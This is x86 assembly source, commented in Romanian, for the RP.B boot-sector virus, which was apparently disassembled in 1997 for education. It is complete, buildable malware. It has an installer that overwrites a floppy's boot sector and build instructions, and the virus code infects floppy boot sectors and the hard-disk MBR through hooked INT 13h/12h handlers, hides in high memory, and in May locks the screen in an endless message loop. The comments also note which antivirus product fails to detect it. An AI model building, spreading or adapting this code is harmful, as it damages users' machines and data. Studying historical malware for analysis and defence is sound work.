; ===================================================
; = RP.B este un virus romanesc                     =
; = prins, dezasamblat si commentat                 =
; = de VMA soft in 1997 pentru scopuri educationale =
; ===================================================

; RP.B este un virus românesc care isi face aparitia vizuala in luna Mai.
; Daca luna curenta este mai el afiseaza in bucla infinita urmatorul
; mesaj :  "Only bugs exist! RP 1995 Bucharest" neproducand infectii.
; Daca nu este luna mai atunci el infecteaza sectoarele de boot ale disktelor
; si tabela de partitii a harddiskului.
; Sectoarul original cu tabela de partitii este copiat pe sectorul fizic 14,
; fata 0, cilindrul 0 la hardiskuri sau pe sectorul fizic 14, fata 1, cil. 0
; la diskete cu MediaByte=0F0h sau pe sectorul 3 la diskete cu MediaByte<>0F0h
; In mod normal la hardisk acest sector este nefolosit iar la disketele ce au
; MediaByte=0F0h acest sector reprezinta sectorul logic 31, adica penultimul
; sector din ROOT (de obicei ROOT-ul are 14 sectoare).
; Virusul se autocopiaza in ultimul KByte de RAM raportat de BIOS si instaleaza
; rutine noi pentru tratarea intreruperilor 13h si 12h.
; Se foloseste un contor care memoreaza de cate ori a fost accesata INT 13H
; in alte scopuri decat pentru a citi MBR-ul sau BOOT-ul. Daca acest contor
; ajunge la 90 atunci INT 12H va returna 640K de memorie. Contorul devine 0
; daca se acceseaza MBR-ul sau BOOT-ul unei dischete.
; OBS: Acest program de instalare a virusului pe disketa nu copiaza sec0 in
; sec31, de aceea la boot-area de pe aceasta disketa veti primi probabil un
; mesaj de eroare din partea BIOS-ului. Urmatoarele diskete ce se vor accesa
; cat si harddiskul vor beneficia de o virusare 'corecta'.

; Pentru asamblarea acestui virus procedati in felul urmator:
;
;    - copiati virusul in fisierul: RPBVIRUS.ASM
;    - dati comanda : TASM RPBVIRUS.ASM
;    - dati comanda : TLINK RPBVIRUS.OBJ /t
;
; Va  rezulta  un  fisier  .COM. La rularea acestuia veti fi intrebat daca
; doriti  sa  instalati  virusul.  Daca  raspundeti afirmativ atunci trebuie sa
; introduceti o disketa in unitatea A:
;
; OBS: Acest virus nu este recunoscut de TBAV 7.07 dar este recunoscut de F-PROT 2.24c


.model tiny
.code
org 100h
entry:

;  =================================================
;  Partea asta copiaza sectorul de BOOT pe discul A:
;  In felul acesta se instaleaza virusul RP in BOOT
;  =================================================

            lea     si, mes1
            call    AfisTxt    ; se afiseaza mesajul introductiv

get_y_n:
            mov     ah,8       ; verifica daca se doreste instalarea virusului
            int     21h
            cmp     al,'D'
            jz      yes
            cmp     al,'d'
            jz      yes
            cmp     al,'N'
            jz      no
            cmp     al,'n'
            jz      no
            jmp     get_y_n

yes:        xor     al,al      ; al = 0 - Discul A:
            mov     cx,1       ; cx = 1 - Numarul de sectoare de scris
            xor     dx,dx      ; dx = 0 - Sectorul de BOOT
            push    ds
            lea     bx,RPVirus
            int     26h        ; scrie 512 bytes de la adresa ds:[bx]
            pop     ax         ; scot byte-ul ramas aiurea pe stiva
            pop     ds
            jc      _Cont1
            lea     si, mes2
            call    AfisTxt
            xor     al,al            ; Se returneaza 0 pentru instalare normala
            jmp     short _Cont2
_Cont1:     lea     si, mes3
            call    AfisTxt
            mov     al,1             ; Se returneaza 1 pentru eroare la scriere pe discul A:
_Cont2:     mov     ah,4Ch
            int     21h

No:         lea     si, mes4
            call    AfisTxt
            mov     al,2             ; Se returneaza 2 pentru program intrerupt de utilizator
            jmp     short _Cont2

mes1:       db 'VMA RPVirus Installer . Versiunea 1.0 (c) VMA software', 0Ah, 0Dh
            db 'Doriti sa instalati virusul in sectorul de BOOT A: (D/N) ?',0Ah, 0Dh, 0
mes2:       db 'Sectorul de BOOT de pe discul A: a fost inlocuit cu succes.', 0Ah, 0Dh,0
mes3:       db 'Eroare la scriere pe discul A:', 0Ah, 0Dh,0
mes4:       db 'Program intrerupt de utilizator! Virusul nu s-a instalat !', 0Ah, 0Dh,0

;  =========================                ; afiseaza sirul ASCIIZ de la
;   Subrutina pentru afisat                 ; adresa ds:[si]
;  =========================

AfisTxt     proc    near
            cld
Next1:
            lodsb                           ; String ds:[si] -> al
            or      al,al                   ; Zero ?
            jnz     Next2                   ; Jump daca nu
            retn
Next2:
            push    si
            mov     ah,0Eh
            int     10h
            pop     si

            jmp     short Next1
AfisTxt     endp


;  ===================================
;  Aici incepe codul pentru virusul RP
;  ===================================

RPVirus      proc    near
FixPoint     equ     7C00h
ProgBegin    equ     $
NewInt13hHan equ     FixPoint+(offset NewInt13h)-ProgBegin
NewInt12hHan equ     FixPoint+(offset NewInt12h)-ProgBegin
Old13hVec    equ     FixPoint+(offset Old13h)-ProgBegin
Old12hVec    equ     FixPoint+(offset Old12h)-ProgBegin
BOOTHdr      equ     Fixpoint+(offset hdr)-ProgBegin
MBRecord     equ     FixPoint+(offset mesaj1)-ProgBegin
ContorNoRead equ     FixPoint+(offset Contor)-ProgBegin
MesajLunaMai equ     FixPoint+(offset mesajmai)-ProgBegin

            jmp     short start
            nop

Hdr:        db 'MSDOS5.0'      ; 8 bytes - Numele si versiune SO
            dw 512             ; Dimensiunea sectorului in octeti
            db 1               ; Numarul de sectoare/cluster
            dw 1               ; Sectoare ocupate pana la prima copie FAT
            db 2               ; Numarul de copii FAT
            dw 224             ; Numarul intrarilor in directorul radacina : 224*32/512=14 sectoare ocupate de ROOT
            dw 2880            ; Numarul total de sectoare ale discului : (2880*512-1457664)/512=33 sectoare rezervate
            db 0F0h            ; Tipul discului identic cu primul byte din FAT (MediaByte)
            dw 9               ; Numarul de sectoare/copie FAT
            dw 18              ; Numarul de sectoare/pista
            dw 2               ; Numarul de fete (capete de citire/scriere)
            dd 0               ; Numarul de sectoare din fata sectorului de BOOT : pt. discheta este 0
            dd 0               ; Nefolosit ( Big total number of sectors )
            dw 0               ; Numarul discului fizic
            db 29h             ; Extended boot sector signature
            db 02h,1Fh,61h,1Dh ; Numarul serial al dischetei
            db 'PCT9U_03-05'   ; 11 bytes - Eticheta dischetei ( Volume label )
            db 'FAT12   '      ; 8 bytes  - Identificator pentru tipul de fisiere

            db 0FAh
Contor:     db 00h
Old13h:     db 54h,  0A2h, 00h, 0F0h
Old12h:     db 41h,  0F8h, 00h, 0F0h

Start:      push    cs
            pop     ds
            mov     ah,4
            int     1Ah                     ; obtine in DH luna curenta

            cmp     dh,5
            jne     Nu_e_MAI
            jmp     LunaMai                 ; daca este luna MAI sare la LunaMai
Nu_e_MAI:
            mov     bx,13h*04h              ; memoreaza la Old13h vectorul INT 13h
            mov     ax,[bx]
            mov     cs:Old13hVec,ax
            mov     bx,13h*04h+2
            mov     ax,[bx]
            mov     word ptr cs:Old13hVec+2,ax

            mov     bx,12h*04h              ; memoreaza la Old12h vectorul INT 12h
            mov     ax,[bx]
            mov     cs:Old12hVec ,ax
            mov     bx,12h*04h+2
            mov     ax,[bx]
            mov     word ptr cs:Old12hVec+2,ax

            mov     bh,04h
            mov     bl,13h                  ; BX = 0413h (Memory size in KBytes)
            mov     ax,[bx]
            dec     ax
            mov     [bx],ax                 ; Scade 1K din memoria raportata de BIOS la adr 413h
            mov     cl,6                    ; Calculeaza in AX segmentul corespunzator
            shl     ax,cl                   ; ultimului K de memorie in care se va copia
            sub     ax,7C0h                 ; virusul
            push    ax

            mov     bx,13h*04h+2
            mov     [bx],ax
            mov     bx,12h*04h+2
            mov     [bx],ax
            mov     bx,13h*04h
            mov     ax,NewInt13hHan         ; Seteaza vectorul INT 13h spre NewInt13h
            mov     [bx],ax
            mov     bx,12h*04h
            mov     ax,NewInt12hHan         ; Seteaza vectorul INT 12h spre NewInt12h
            mov     [bx],ax

            pop     ax                      ; AX = segmentul corespunzator ultimului KByte
            mov     si,FixPoint
            mov     di,si
            mov     es,ax
            mov     cx,512/2
            cld                             ; Copiaza virusul de la adresa 0:7C00h
            rep     movsw                   ; in ultimul KByte de memori

            int     19h                     ; Incarca sistemul

NewInt13h:  cmp     ah,2                    ; AH=2 Functia de citire sectoare
            jne     NoBOOTRead              ; Verifica daca se citeste MasterBOOT-ul sau BOOT-ul la diskete
            cmp     cx,1                    ; sau sectorul de BOOT la dischete
            jne     NoBOOTRead              ; Petru citire trebuie:
            cmp     dh,0                    ;  AX = 0201h ; CX = 1 ; DH = 00h
            jne     NoBOOTRead              ;  DL = 80h => HardDisk ; DL = 0 => FloppyDisk
            mov     byte ptr cs:ContorNoRead ,0 ; Daca se citeste sectorul respectiv atunci Contor=0
            pushf
            call    dword ptr cs:Old13hVec  ; Se apeleaza vechea rutina pt INT 13h
            jc      loc_ret_7               ; JMP loc_ret_7 daca eroare la citire
            cmp     word ptr es:[bx][offset VirusFlag-progbegin],0303h ; Verifica daca sectorul citit este deja infectat
            je      loc_6                   ; Daca DA atunci citeste sectorul original pe care l-a salvat in alta parte (vezi Calcul)
            call    sub_1                   ; Daca NU atunci copiaza sectorul original in alta parte (vezi Calcul)
            jnc     loc_3
            clc
            retf    2                       ; Daca eroare la scriere atunci se revine din intrerupere
loc_3:
            push    ds
            push    es
            pop     ds                      ; DS=ES
            push    cs
            pop     es                      ; ES=CS
            mov     si,bx
            add     si,1BEh
            mov     di,MBRecord
            mov     cx,66/2                 ; Copiaza 66 de bytes de la offsetul 1BEh relativ la sectorul citit
            cld                             ; in zona cu Mesaj1. (cei 66 de bytes reprezinta Master Boot Record daca este HardDisk)
            rep     movsw
            mov     si,bx
            add     si,3
            mov     di,BOOTHdr
            mov     cx,60/2                 ; Copiaza 60 de bytes de la offsetul 3 relativ la sectorul citit
            cld                             ; in zona cu Hdr. (cei 60 de bytes reprezinta datele din BOOT daca este disketa)
            rep     movsw
            pop     ds
            mov     ax,0301h                ; Se scrie pe disc in sectorul 1
            mov     cx,1                    ; zona de memorie ce contine virusul
            mov     bx,FixPoint
            xor     dh,dh                   ; DH=0 -> Partition Table sau BOOT Dischete
            pushf
            call    dword ptr cs:Old13hVec 
            retf    2

NoBOOTRead:
            cmp     byte ptr cs:ContorNoRead ,90
            je      loc_5
            inc     byte ptr cs:ContorNoRead 
loc_5:
            jmp     dword ptr cs:Old13hVec 


sub_1       proc    near                   ; Copiaza sectorul original care nu este infectat
            call    Calcul                 ; la noua pozitie returnata de Calcul
            mov     ax,301h
            pushf
            call    dword ptr cs:Old13hVec 
            retn
sub_1       endp

loc_6:      call    Calcul                 ; Daca sectorul citit (MB sau BOOT) este deja infectat atunci
            mov     ax,0201h               ; se citeste sectorul 14 in loc de MB pt HardDisk-uri sau
            pushf                          ; se citeste sectorul 14 sau 3 in loc de BOOT pt dischete
            call    dword ptr cs:Old13hVec 
loc_ret_7:  retf    2


Calcul      proc    near                    ; Subrutina CALCUL returneaza:
            mov     cl,14                   ; CL=14        daca MB HardDisk (DL>=80h)
            cmp     dl,80h                  ; CL=14 & DH=1 daca Discketa cu MediaByte=0F0h
            jae     CalculRet               ; CL=3  & DH=1 daca Discketa cu MediaByte<>0F0h
            mov     dh,1
            mov     al,es:[bx+15h]          ; ES:[BX+15h]=MediaByte
            cmp     al,0F0h
            je      CalculRet
            mov     cl,3
CalculRet:  retn
Calcul      endp


NewInt12h:  cmp     byte ptr cs:ContorNoRead ,90
            jne     cont1
            mov     ax,640
            iret
Cont1:      jmp     dword ptr cs:Old12hVec 


MesajMai:   ;       Aici este urmatorul (MESAJ) XOR 240
            ;       db  'Only bugs exist! ',10h
            ;       db  'RP 1995 Bucharest',0D4h
            db      0BFh, 9Eh,  9Ch,  89h,  0D0h, 92h,  85h,  97h,  83h
            db      0D0h, 95h,  88h,  99h,  83h,  84h,  0D1h, 0D0h, 0EAh
            db      0A2h, 0A0h, 0D0h, 0C1h, 0C9h, 0C9h, 0C5h, 0D0h, 0B2h
            db      85h,  93h,  98h,  91h,  82h,  95h,  83h,  84h,  '$'

LunaMai:    xor     ax,ax                   ; Seteaza modul video 0
            int     10h

            mov     si,MesajLunaMai
            mov     bx,000Ah                ; BH=0 -> pagina 0 ; BL=10 -> culoarea
            mov     cx,1                    ; De cate ori afiseaza caracterul
            mov     dx,0A01h
Cont2:
            mov     ah,2
            inc     dl                      ; Coordonatele cursorului: DH=10;DL=2
            int     10h                     ; Pozitioneaza cursorul la (L=10,C=2)

            mov     ah,9                    ; Functia de scriere caracter si atribut la cursor
            lodsb                           ; Preia cate un caracter din MesajMai
            cmp     al,'$'
            je      Cont3
            xor     al,240                  ; Decodifica : CARACTER XOR 240
            int     10h                     ; Afiseaza caracter
            jmp     short Cont2

Cont3:      mov     cx,0FFFFh
Delay:      loop    Delay                   ; Produce un Delay
            jmp     short LunaMai           ; Intra in bucla infinita: <Setare mod 0; Afisare Txt; Delay>

VirusFlag:  db      03h, 03h                ; Semnatura virusului in sector
Mesaj1:     db      0Ah,'Replace and press any key when ready', 0Dh, 0Ah, 0
            db      'IO      SYS'
            db      'MSDOS   SYS'

progend     equ     $
            db      00h,000h
            db      55h,0AAh                ; Semnatura pentru sector MB sau BOOT

            RPVirus endp

            end     entry

